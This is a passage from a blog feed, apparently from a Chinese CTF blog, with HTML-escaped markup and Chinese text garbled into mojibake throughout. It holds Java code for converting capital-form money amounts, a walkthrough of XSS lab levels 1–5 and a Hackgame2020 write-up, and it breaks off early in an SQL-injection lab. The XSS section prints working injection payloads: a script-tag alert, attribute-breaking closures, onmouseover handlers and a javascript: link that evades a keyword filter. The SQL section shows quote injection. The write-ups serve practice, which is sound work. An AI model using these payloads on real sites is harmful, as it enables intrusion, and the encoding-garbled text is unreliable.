&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Scanner sn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Scanner(System.&lt;span style="color:#a6e22e">in&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String str;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> x;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> cnt&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> result&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(cnt&lt;span style="color:#f92672">++!=&lt;/span>1000){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> str &lt;span style="color:#f92672">=&lt;/span> sn.&lt;span style="color:#a6e22e">next&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> sn.&lt;span style="color:#a6e22e">nextInt&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">+=&lt;/span> tonum(str)&lt;span style="color:#f92672">*&lt;/span>x;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">double&lt;/span> &lt;span style="color:#a6e22e">tonum&lt;/span>(String s){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> res&lt;span style="color:#f92672">=&lt;/span>0,temp &lt;span style="color:#f92672">=&lt;/span> 1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> result&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> s.&lt;span style="color:#a6e22e">length&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">=&lt;/span>0;i&lt;span style="color:#f92672">&amp;lt;&lt;/span>len;i&lt;span style="color:#f92672">++&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (s.&lt;span style="color:#a6e22e">charAt&lt;/span>(i)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;å£¹&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>1;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;è´°&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>2;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;å&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>3;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;è‚†&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>4;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ä¼&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>5;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;é™†&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>6;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;æŸ’&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>7;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;æŒ&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>8;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ç–&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>9;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;é›¶&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;æ‹¾&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>10;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ä½°&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>100;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;å…ƒ&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;è§’&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>0.&lt;span style="color:#a6e22e">1&lt;/span>;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;åˆ†&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>0.&lt;span style="color:#a6e22e">01&lt;/span>;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;æ•´&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">default&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;è¿™ä¸ªè®¤ä¸å‡ºæ¥&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> s.&lt;span style="color:#a6e22e">charAt&lt;/span>(i));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€‹	ç¨‹åºç”¨çš„æ§åˆ¶å°è¾“å…¥ï¼Œç›´æ¥è¡¨æ ¼ä¸¤åˆ—ä»å¤´æ‹‰å€’å°¾ç²˜è´´ï¼Œå‡ºç­”æ¡ˆã€‚ç¨‹åºçš„æ€è·¯å°±æ˜¯æŠŠé‡‘é¢å¤§å†™å½“åšå­—ç¬¦ä¸²å¤„ç†ï¼Œæ¯ä¸€ä½ç”¨&lt;code>switch&lt;/code>åˆ¤æ–­æ•°å­—æˆ–æ˜¯ä¸ªã€åã€ç™¾ã€åƒé‚£ä¸€ä½ä¸Šçš„æ•°å­—ã€‚&lt;/p></description></item><item><title>XSS-Lab (ä¸€)</title><link>/posts/ctf/xss-lab1/</link><pubDate>Tue, 03 Nov 2020 10:13:39 +0000</pubDate><guid>/posts/ctf/xss-lab1/</guid><description>&lt;h2 id="å¤´">å¤´&lt;/h2>
&lt;p>é¶æœºåœ°å€ï¼šhttps://buuoj.cn/challenges#XSS-Lab&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsmJ5n.png" alt="">&lt;/p>
&lt;h2 id="level-1">level 1&lt;/h2>
&lt;p>â€‹	&lt;img src="https://s1.ax1x.com/2020/11/03/BsmfKO.png" alt="">&lt;/p>
&lt;p>â€‹	è§‚å¯Ÿå‘ç°&lt;code>æ¬¢è¿ç”¨æˆ·test&lt;/code>ä¸URLä¸­çš„&lt;code>name=test&lt;/code>å­—æ®µå¯¹åº”ï¼Œå°è¯•ä¿®æ”¹å‘ç°å¯è¡Œã€‚ç›´æ¥å°†&lt;code>name&lt;/code>å­—æ®µæ”¹ä¸º&lt;code>name=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&lt;/code>ï¼Œå®Œå·¥ã€‚&lt;/p>
&lt;h2 id="level-2">level 2&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsnwWt.png" alt="">&lt;/p>
&lt;p>â€‹	åœ¨æœç´¢æ ä¸­çš„è¾“å…¥ä¼šå›æ˜¾åˆ°é¡µé¢ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°å€¼åœ¨&lt;code>input&lt;/code>çš„&lt;code>value&lt;/code>å±æ€§ä¸­&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsnLk9.png" alt="">&lt;/p>
&lt;p>â€‹	æ„é€ é—­åˆ&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>ï¼Œæ„é€ ä»¥åçš„æ ‡ç­¾ä¼šå˜æˆ&lt;code>.... value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &amp;quot;&amp;gt;&lt;/code>ã€‚å®Œå·¥&lt;/p>
&lt;h2 id="level-3">level 3&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsKwKf.png" alt="">&lt;/p>
&lt;p>â€‹	è€æ ·å­æ„é€ &lt;code>value&lt;/code>å±æ€§é—­åˆï¼Œå°è¯•&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>æ„é€ é—­åˆï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°è¯­å¥å˜æˆ&lt;code>&amp;amp;quot;&amp;amp;gt; &amp;amp;lt;script&amp;amp;gt;alert()&amp;amp;lt;/script&amp;amp;gt; // &lt;/code>ï¼Œè¯´æ˜æŠŠ&lt;code>&amp;quot;ã€&amp;lt;ã€&amp;gt;ã€&lt;/code>è¿›è¡Œäº†htmlç¼–ç è¿‡æ»¤ï¼Œå°è¯•æ„é€ &lt;code>onmouseover&lt;/code>äº‹ä»¶(é¼ æ ‡ç§»åˆ°äº‹ä»¶)ï¼Œæ„é€ è¯­å¥&lt;code>'onmouseover='alert()'&lt;/code>ã€‚å®Œå·¥&lt;/p>
&lt;h2 id="level-4">level 4&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsMWYd.png" alt="">&lt;/p>
&lt;p>â€‹	æ„é€ é—­åˆ&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°è¿›è¡Œäº†&lt;code>&amp;gt;ã€&amp;lt;&lt;/code>è¿‡æ»¤ï¼Œå°è¯•æ„é€ äº‹ä»¶&lt;code>&amp;quot; onmouseover='alert()'&lt;/code>ã€‚å®Œå·¥&lt;/p>
&lt;p>â€‹	è¯´æ˜ä¸€ä¸‹æ ‡ç­¾çš„äº‹ä»¶æœ‰å¾ˆå¤šç±»å‹ï¼Œå¯ä»¥è‡ªå·±è¯•è¯•åˆ«çš„äº‹ä»¶å“åº”ã€‚&lt;/p>
&lt;h2 id="level-5">level 5&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/Bs1Ci4.png" alt="">&lt;/p>
&lt;p>â€‹	æ£€æŸ¥ä¸€ä¸‹éƒ½æœ‰ä»€ä¹ˆè¿‡æ»¤ã€‚å‘ç°æœ‰ä¸€ä¸‹è¿‡æ»¤&lt;/p>
&lt;blockquote>
&lt;p>script &amp;ndash;&amp;gt; scr_ipt&lt;/p>
&lt;p>onmouseover &amp;ndash;&amp;gt; o_nmouseover&lt;/p>
&lt;/blockquote>
&lt;p>æ— æ³•é‡‡ç”¨äº‹ä»¶ï¼Œé‚£ä¹ˆå°è¯•æ„é€ ä¸€ä¸ªæ ‡ç­¾&lt;code> &amp;quot;&amp;gt; &amp;lt;a href='javascript:alert()'&amp;gt;233&amp;lt;/a&amp;gt; //&lt;/code>ï¼Œå‘ç°&lt;code>javascript&lt;/code>æ²¡æœ‰è¿‡æ»¤ï¼Œè¯´æ˜åˆ¤æ–­è¯­å¥åŒ¹é…å€¼ä»…ä»…ä¸º&lt;code>script&lt;/code>ï¼Œç‚¹å‡»æ„é€ çš„&lt;code>&amp;lt;a&amp;gt;&lt;/code>æ ‡ç­¾å†…å®¹ã€‚å®Œå·¥&lt;/p>
&lt;p>â€‹&lt;/p></description></item><item><title>Hackgame2020(ä¸€)</title><link>/posts/ctf/hackgame20201/</link><pubDate>Sun, 01 Nov 2020 18:33:40 +0000</pubDate><guid>/posts/ctf/hackgame20201/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€&lt;/h2>
&lt;p>æ¯”èµ›åœ°å€ï¼šhttps://hack.lug.ustc.edu.cn/&lt;/p>
&lt;h1 id="web">web&lt;/h1>
&lt;h3 id="ç­¾åˆ°é¢˜">ç­¾åˆ°é¢˜&lt;/h3>
&lt;p>â€‹	ç¬¬ä¸€é¢˜æ˜¯flagæå–å™¨ï¼Œæ‰“å¼€é¢˜ç›®ä»¥åé¡µé¢æ˜¯ä¸€ä¸ªæå–å™¨ä¸‹é¢ä¸€ä¸ª&lt;code>è¿›åº¦æ¡&lt;/code>å’Œä¸€ä¸ª&lt;code>æå–&lt;/code>æŒ‰é’®ã€‚&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwJbJs.png" alt="BwJbJs.png">&lt;/p>
&lt;p>â€‹	éšä¾¿æ‹‰äº†æ‹‰è¿›åº¦æ¡å‘ç°åˆå§‹æ˜¯&lt;code>0&lt;/code>æœ«å°¾æ˜¯&lt;code>1.5&lt;/code>ï¼Œç„¶åä¸­é—´çš„æ•°å€¼éƒ½æ˜¯å°æ•°&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwYAQx.png" alt="BwYAQx.png">&lt;/p>
&lt;p>â€‹	æˆ‘çŒœçš„é¢˜ç›®å¯èƒ½æ˜¯æƒ³è®©æ•°å€¼ä¸º&lt;code>1&lt;/code>æ—¶èƒ½æå–åˆ°flagã€‚&lt;/p>
&lt;p>â€‹	F12æŸ¥çœ‹æºä»£ç ï¼Œå®šä½åˆ°è¿›åº¦æ¡çš„æ ‡ç­¾ï¼ŒæŸ¥çœ‹å±æ€§&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwYoX6.png" alt="">&lt;/p>
&lt;p>â€‹	ç¡®å®å’ŒçŒœæµ‹ä¸€æ ·æœ€å¤§æœ€å°å€¼åˆ†åˆ«æ˜¯&lt;code>0&lt;/code>ã€&lt;code>1.5&lt;/code>ï¼Œæ³¨æ„åˆ°&lt;code>step&lt;/code>å€¼ä¸º&lt;code>0.00001&lt;/code>ï¼Œå°±æ˜¯è¿™ä¸ªå±æ€§è®©æˆ‘ä»¬æ‹–åŠ¨è¿›åº¦æ¡æ—¶ï¼Œé€’å¢çš„å€¼æ˜¯å°æ•°ï¼Œæƒ³ç²¾å‡†å¾—åˆ°&lt;code>1&lt;/code>ä¸ªflagï¼Œå°±æŠŠç½‘é¡µä¸Šçš„&lt;code>step&lt;/code>å€¼æ”¹ä¸º&lt;code>1&lt;/code>ã€‚ç„¶åéšä¾¿æ‹–åŠ¨ä¸€ä¸‹è¿›åº¦æ¡å¾—åˆ°&lt;code>1&lt;/code>ï¼Œç‚¹å‡»&lt;code>æå–&lt;/code>æŒ‰é’®ï¼Œå®Œå·¥ã€‚&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwNVaD.png" alt="">&lt;/p>
&lt;h3 id="2048">2048&lt;/h3>
&lt;p>â€‹	æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ª&lt;code>2048&lt;/code>çš„å°æ¸¸æˆï¼Œç¬¬ä¸€ä¸ªæƒ³æ³•å°±æ˜¯ç©&lt;code>2048&lt;/code>è¾¾åˆ°ä¸€å®šåˆ†æ•°ä»¥åä¼šè·å¾—flagï¼ˆ&lt;del>å¯æ¶è¿™ä¸ªæ¯”èµ›æ€ä¹ˆçŸ¥é“æœ€è¿‘æˆ‘å¤©å¤©åœ¨ç©2048çš„&lt;/del>ï¼‰,ä½†æ˜¯æƒ³æ¯”èµ›ä¸å¯èƒ½è®©é€‰æ‰‹åœ¨çº¿ç©æ¸¸æˆå§ï¼Œå°¤å…¶å¯¹äºæˆ‘è¿™ç§&lt;del>é€ƒè¯¾åºŸç‰©&lt;/del>æ˜¯ä¸å¯èƒ½åŠªåŠ›å“’ï¼&lt;/p>
&lt;p>F12å¼€å§‹ç¿»ç½‘é¡µèµ„æº&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwUONF.png" alt="">&lt;/p>
&lt;p>â€‹	è¿˜å¥½ä¸Šæ¬¡&lt;del>æ‘¸é±¼&lt;/del>è¯¾é¢˜åšäº†ä¸€ä¸ªç½‘é¡µç‰ˆçš„2048ï¼Œç•¥å¾®èƒ½çœ‹æ‡‚ä¸€ç‚¹ç‚¹ç»“æ„ï¼Œç¬¬ä¸€ä¸ª&lt;code>animframe_polyfill&lt;/code>åº”è¯¥å°±æ˜¯ç®¡åŠ¨ç”»æ•ˆæœçš„ï¼Œ&lt;code>keynpard...&lt;/code>è¿™ä¸ªè‚¯å®šæ˜¯ç›¸åº”æŒ‰é”®çš„ï¼Œ&lt;code>local_storage_manager&lt;/code>åº”è¯¥æ˜¯ä¿å­˜æ¸¸æˆçš„ï¼Œ&lt;code>game_manager&lt;/code>æ„Ÿè§‰å°±æ˜¯ç®¡ç†æ•´ä¸ªæ¸¸æˆçš„ä¸»è¦æ–‡ä»¶ã€‚&lt;/p>
&lt;p>â€‹	æ‰“å¼€&lt;code>game_manager&lt;/code>ç²—ç•¥çš„çœ‹äº†ä¸‹å˜é‡ï¼Œ&lt;code>score&lt;/code> åˆ†æ•°ã€&lt;code>overã€wonã€keepPlaying&lt;/code>æ¸¸æˆçŠ¶æ€ï¼Œæƒ³èµ¢æ¸¸æˆè‚¯å®šæ˜¯å’Œ&lt;code>scoreã€won&lt;/code>æœ‰å…³ï¼Œç›´æ¥Ctrl+Fæœç´¢æ•´ä¸ªæ–‡æ¡£è¿™ä¸¤ä¸ªå˜é‡å‡ºç°çš„ä½ç½®ã€‚&lt;/p>
&lt;p>å‘ç°äº†&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwdGdK.png" alt="">&lt;/p>
&lt;p>â€‹	åªæœ‰è¿™é‡Œä¿®æ”¹äº†&lt;code>won&lt;/code>çš„çŠ¶æ€ï¼Œå‰é¢è¿˜æœ‰ä¸ª&lt;code>16384&lt;/code>è¿™ä¸ªåº”è¯¥å°±æ˜¯è·å¾—èƒœåˆ©éœ€è¦å¾—åˆ°çš„åˆ†æ•°ï¼Œè¿™ä¸ªåˆ†æ•°å¯¹äºæˆ‘æ¥è¯´è¿˜æ˜¯ç®€ç®€å•å•ï¼ˆ&lt;del>å°å£°bb&lt;/del>&lt;a href="https://s1.ax1x.com/2020/11/01/BwUdte.jpg">æˆªå›¾ä¸ºè¯&lt;/a>ï¼‰ï¼Œç›´æ¥è®©&lt;code>if&lt;/code>é‡Œé¢çš„è¯­å¥ä¸ºçœŸå°±å¯ä»¥è·èƒœï¼Œç›´æ¥ä¿®æ”¹&lt;code>if(1) self.won = true&lt;/code>ï¼Œä¿å­˜æ–‡ä»¶ï¼ŒæŒ‰ä¸€ä¸ªæ–¹å‘é”®è®©è¯­å¥æ‰§è¡Œåˆ°ï¼Œå®Œå·¥ã€‚&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwwpTK.png" alt="">&lt;/p>
&lt;h1 id="general">general&lt;/h1>
&lt;h3 id="çŒ«å’ªé—®é¢˜">çŒ«å’ªé—®é¢˜++&lt;/h3>
&lt;p>â€‹	ç§‰ç€å‰é¢é¢˜éƒ½æ˜¯ç®€å•é¢˜ï¼Œè¯•ç€åšäº†ä¸€ä¸‹ï¼Œçœ‹åˆ°é¢˜ç›®æç¤ºçš„æœ‰å¾€å¹´çš„é—®é¢˜é¢˜è§£&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwLtDs.png" alt="">&lt;/p>
&lt;p>â€‹	é¢˜æ„æ€å¾ˆæ˜æ˜¾çš„ä¹¦è€ƒéªŒåŒå­¦çš„æœé¢˜æŠ€å·§ã€‚é‚£å°±å¼€å·¥ã€‚&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwLD8U.png" alt="">&lt;/p>
&lt;h4 id="ç¬¬ä¸€é¢˜">ç¬¬ä¸€é¢˜&lt;/h4>
&lt;blockquote>
&lt;ol>
&lt;li>ä»¥ä¸‹ç¼–ç¨‹è¯­è¨€ã€è½¯ä»¶æˆ–ç»„ç»‡å¯¹åº”æ ‡å¿—æ˜¯å“ºä¹³åŠ¨ç‰©çš„æœ‰å‡ ä¸ªï¼Ÿ&lt;/li>
&lt;/ol>
&lt;p>Dockerï¼ŒGolangï¼ŒPythonï¼ŒPlan 9ï¼ŒPHPï¼ŒGNUï¼ŒLLVMï¼ŒSwiftï¼ŒPerlï¼ŒGitHubï¼ŒTortoiseSVNï¼ŒFireFoxï¼ŒMySQLï¼ŒPostgreSQLï¼ŒMariaDBï¼ŒLinuxï¼ŒOpenBSDï¼ŒFreeDOSï¼ŒApache Tomcatï¼ŒSquidï¼ŒopenSUSEï¼ŒKaliï¼ŒXfce.&lt;/p>
&lt;p>æç¤ºï¼šå­¦æœ¯ä¸Šä¸€èˆ¬è®¤ä¸ºé¾™ä¸å±äºå“ºä¹³åŠ¨ç‰©ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>â€‹	æœ¬äººåªè®¤è¯†å‡ ä¸ªï¼Œé‚£å°±ä¸€ä¸ªä¸€ä¸ªæœå‘—ã€‚æˆ‘çš„æ¨¡å¼æ˜¯ï¼šç™¾åº¦&lt;code>xxxæ ‡å¿—&lt;/code>ç„¶åç¬¬äºŒæ¡å°±æ˜¯ç™¾åº¦å›¾ç‰‡çš„æœç´¢ç»“æœï¼Œå¤§è‡´è¾¨åˆ«ä¸€ä¸‹ï¼Œç„¶åå†ç™¾åº¦&lt;code>xxxæ˜¯å“ºä¹³åŠ¨ç‰©å—&lt;/code>ï¼Œå¦¥å¦¥çš„&lt;del>èƒå„¿&lt;/del>æ•™å­¦ã€‚&lt;/p>
&lt;p>â€‹	ä¸€ä¸ªæ¯”è¾ƒæœ‰å°è±¡å°±æ˜¯&lt;code>FreeDOS&lt;/code>è¿™ä¸ªæ ‡å¿—å°±ç¦»è°±ï¼Œä»€ä¹ˆç©æ„&lt;/p>
&lt;p>&lt;img src="https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg" alt="">&lt;/p>
&lt;p>&lt;strong>å‚è€ƒç­”æ¡ˆ ï¼š12&lt;/strong>&lt;/p>
&lt;h4 id="ç¬¬äºŒé¢˜">ç¬¬äºŒé¢˜&lt;/h4>
&lt;blockquote>
&lt;ol start="2">
&lt;li>ç¬¬ä¸€ä¸ªä»¥ä¿¡é¸½ä¸ºè½½ä½“çš„ IP ç½‘ç»œæ ‡å‡†çš„ RFC æ–‡æ¡£ä¸­æ¨èä½¿ç”¨çš„ MTU (Maximum Transmission Unit) æ˜¯å¤šå°‘æ¯«å…‹ï¼Ÿ&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;p>â€‹	å¡äº†æˆ‘å¥½ä¸€ä¼šï¼Œæ²¡å¬è¿‡ä¿¡é¸½ä¼ è¾“ï¼Œè´´ä¸Šæœ€åæ‰¾åˆ°ç­”æ¡ˆçš„&lt;a href="https://blog.csdn.net/qq_31621387/article/details/77690642">åšå®¢&lt;/a>ï¼Œä»¥åŠä¸€ç¯‡ä¿¡é¸½ä¼ è¾“çš„&lt;a href="http://sohu.com/a/309403082_354973">å†å²å‘å±•&lt;/a>ï¼Œé•¿è§è¯†äº†ã€‚&lt;/p></description></item><item><title>sql-labs(ä¸€)</title><link>/posts/ctf/sql-labs1/</link><pubDate>Tue, 22 Sep 2020 10:50:08 +0000</pubDate><guid>/posts/ctf/sql-labs1/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€&lt;/h2>
&lt;p>åœ¨çº¿é¶æœºåœ°å€ï¼šhttps://buuoj.cn/challenges#sqli-labs&lt;/p>
&lt;h2 id="less-1">less-1&lt;/h2>
&lt;p>â€‹	é¦–å…ˆè¯´æ˜sqlæ³¨å…¥çš„å¤§è‡´æ­¥éª¤ï¼š&lt;/p>
&lt;ul>
&lt;li>åˆ¤æ–­æ³¨å…¥ç±»å‹ã€‚å¦‚æ•´å‹å­—ç¬¦å‹æ³¨å…¥ç­‰ã€‚&lt;/li>
&lt;li>åˆ¤æ–­åˆ—æ•°&lt;/li>
&lt;li>åˆ¤æ–­æ•°æ®çš„å›æ˜¾ä½&lt;/li>
&lt;li>æ„é€ sqlè¯­å¥&lt;/li>
&lt;/ul>
&lt;p>â€‹	æ ¹æ®é¢˜ç›®æç¤ºï¼Œè¯´æ˜æ˜¯ä¸€ä¸ªå•å¼•å·æ³¨å…¥é¢˜ç›®ï¼Œæ„é€ ä¸€ä¸ªå¸¦å•å¼•å·çš„è¯­å¥&lt;code>?id=1'&lt;/code>ï¼Œå‘ç°æ•°æ®åº“æŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgERNd.png" alt="">&lt;/p>
&lt;p>â€‹	é€šè¿‡åé¢çš„æŠ¥é”™è¯­å¥&lt;code>1'' LIMIT 0,1&lt;/code>çš„åˆ†æï¼Œæˆ‘ä»¬çš„å•å¼•å·è¢«æ•°æ®åº“è§£æï¼Œé‚£ä¹ˆè¯´æ˜æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨è¿æ¥æŸ¥è¯¢&lt;code>union&lt;/code>æ’å…¥æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„è¯­å¥ã€‚&lt;/p>
